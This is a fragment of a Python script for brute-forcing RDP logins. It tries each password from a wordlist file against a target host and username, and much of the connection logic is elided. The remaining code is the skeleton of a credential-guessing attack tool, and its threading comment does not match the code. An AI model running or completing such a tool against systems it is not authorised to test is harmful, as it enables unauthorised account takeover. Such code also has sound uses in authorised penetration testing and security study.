    ...
    def check_rdp(host, username, password, domain, hashes = None):
       ...
       try:
           ...
           if str(err).find("denied") > 0:
               ...
               sys.stdout.write('\r[-] [%s:%s] Access Denied            '%(username,password))
           else:
               logging.error(err)
               time.sleep(5)
           return
...
def brute(host, username, passwords, domain, hashes = None):
  for p in passwords:
    if check_rdp(host, username, p, domain, hashes = None):
      break
...
host=sys.argv[1]
username=sys.argv[2]
passwords=chunk([x.strip() for x in open(sys.argv[3])],5) # Number of threads == 15
domain=''
